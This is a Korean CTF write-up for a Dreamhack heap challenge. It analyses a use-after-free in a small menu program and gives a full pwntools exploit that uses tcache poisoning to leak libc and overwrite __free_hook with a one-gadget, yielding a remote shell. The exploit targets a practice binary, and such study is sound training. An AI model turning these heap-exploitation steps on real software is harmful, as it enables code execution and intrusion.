```c
// Name: tcache_poison.c
// Compile: gcc -o tcache_poison tcache_poison.c -no-pie -Wl,-z,relro,-z,now

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  void *chunk = NULL;
  unsigned int size;
  int idx;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    printf("1. Allocate\n");
    printf("2. Free\n");
    printf("3. Print\n");
    printf("4. Edit\n");
    scanf("%d", &idx);

    switch (idx) {
      case 1:
        printf("Size: ");
        scanf("%d", &size);
        chunk = malloc(size);
        printf("Content: ");
        read(0, chunk, size - 1);
        break;
      case 2:
        free(chunk);
        break;
      case 3:
        printf("Content: %s", chunk);
        break;
      case 4:
        printf("Edit chunk: ");
        read(0, chunk, size - 1);
        break;
      default:
        break;
    }
  }

  return 0;
}
```

```bash
$ checksec ./tcache_poison
[*] './tcache_poison'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 코드 분석

* `tcache_poison.c:31-33` : 청크를 해제한 후 `chunk` 포인터를 초기화하지 않으므로 dangling pointer가 발생하며, 이를 활용하면 double free bug를 발생시킬 수 있다.
* `tcache_poison.c:37-40` : `chunk` 포인터가 초기화되지 않았으므로 dangling pointer가 가리키는 해제된 chunk의 데이터를 마음대로 수정할 수 있다.

# 공격

## Tcache Poisoning

위에서 살펴봤듯, 관련된 보호 기법이 없으므로 적당한 크기의 청크를 할당하고, `key`를 조작한 뒤, 다시 해제하면 Tcache Duplication이 가능하다.
그 상태에서, 다시 청크를 할당하고 원하는 주소를 값으로 쓰면 tcache에 임의 주소를 추가할 수 있을 것입니다.

## Libc Leaking

`tcache_poison.c:13-14`를 보면, `setvbuf` 함수에 인자로 `stdin`과 `stdout`을 전달하는데, 이 포인터 변수들은 각각 `libc` 내부의 `IO_2_1_stdin`과 `IO_2_1_stdout`을 가리킨다.
따라서 이 중 한 값을 읽으면 그 값을 이용하여 `libc`의 베이스를 계산할 수 있다.

이 포인터들은 전역 변수로서 bss에 위치하는데, PIE가 적용되어 있지 않으므로 포인터들의 주소는 고정되어 있다.
따라서 tcache poisoning으로 포인터 변수의 주소에 청크를 할당하여 그 값을 읽을 수 있다.

## Hook Overwrite to Get Shell

`libc`의 베이스를 구한 뒤, 이로부터 one-gadget의 주소와 `__free_hook`의 주소를 계산 가능하다.
다시 tcache poisoning으로 `__free_hook`에 청크를 할당한 후, 그 청크에 적절한 one-gadget의 주소를 쓰면 `free`를 호출하여 shell을 탈취할 수 있다.

```bash
$ one_gadget libc-2.27.so 
0x4f3ce execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```

이중 조건을 만족하는 one-gadget을 찾기 위해 gdb를 활용하여 `__free_hook`을 호출한 직후의 스택을 확인해보면 다음과 같은 결과를 얻을 수 있다.

```bash
pwndbg> x/gx $rsp+0x40
0x7fffffffe508: 0x0000000000000000
pwndbg> x/gx $rsp+0x70
0x7fffffffe538: 0x000000000040087e
```

따라서 `[rsp+0x40] == NULL`이면 제한조건이 만족되는 `0x4f432`를 사용하면 됨을 알 수 있다.

## Exploit

위 사실들을 바탕으로 익스플로잇 코드를 작성하면 다음과 같다.

```python
# Name: Tcache Poisoning.py

from pwn import *

def slog(name,addr): success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 24515

p = remote(HOST,PORT) # remote
# p = process('./tcache_poison') # local
e = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')


#ifndef __Custom_Functions_For_Convenience_
#define __Custom_Functions_For_Convenience_
def alloc(size, data):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Content: ', data)

def free():
    p.sendlineafter(b'Edit\n', b'2')

def print():
    p.sendlineafter(b'Edit\n', b'3')

def edit(data):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b'Edit chunk: ', data)
#endif /* __Custom_Functions_For_Convenience_ */

#ifndef __Global_Variables_For_Convenience_
#define __Global_Variables_For_Convenience_
dummy = b'D'
one_gadget_offset = 0x4f432
free_hook_offset = libc.symbols['__free_hook']
io_2_1_stdout = libc.symbols['_IO_2_1_stdout_']
#endif /* __Global_Variables_For_Convenience_ */

# Initial tcache is empty.
# tcache[0x40]: empty

# tcache[0x40]: Chunk A
alloc(0x30, b'dobby is free') # Allocate Chunk A
free() # tcache[0x40].append(Chunk A)

# tcache[0x40]: Chunk A -> Chunk A
edit(dummy * 8 + b'\x00') # Bypassing the DFB mitigation
free() # tcache[0x40].append(Chunk A)

# tcache[0x40]: chunk A -> stdout -> _IO_2_1_stdout_ -> ...
addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout)) # tcache[0x40].pop(); tcache[0x40].first().set_fd(addr_stdout)

# tcache[0x40]: stdout -> _IO_2_1_stdout_ -> ...
alloc(0x30, dummy) # tcache[0x40].pop()

# tcache[0x40]: _IO_2_1_stdout_ -> ...
io_2_1_stdout_lsb = p64(io_2_1_stdout)[0:1] # The least significant byte of _IO_2_1_stdout_.
                                            # This is necessary not to change the position the stdout points to.
alloc(0x30, io_2_1_stdout_lsb)  # tcache[0x40].safe_pop()

# Libc leak
print()
p.recvuntil('Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = stdout - io_2_1_stdout
free_hook = libc_base + free_hook_offset
one_gadget = libc_base + one_gadget_offset

# Logging
slog('libc base', libc_base)
slog('__free_hook', free_hook)
slog('one gadget', one_gadget)

# tcache[0x50]: empty

# tcache[0x50]: Chunk B
alloc(0x40, b'dobby is free') # Allocate Chunk B
free() # tcache[0x50].append(Chunk B)

# tcache[0x50]: Chunk B -> Chunk B
edit(dummy * 8 + b'\x00') # Bypassing the DFB mitigation
free() # tcache[0x50].append(Chunk B)

# tcache[0x50]: Chunk B -> __free_hook -> ...
alloc(0x40, p64(free_hook)) # tcache[0x50].pop(); tcache[0x50].first().set_fd(free_hook)

# tcache[0x50]: __free_hook -> ...
alloc(0x40, dummy)

# __free_hook = one_gadget
alloc(0x40, p64(one_gadget))

# call free()
free()

p.interactive()
```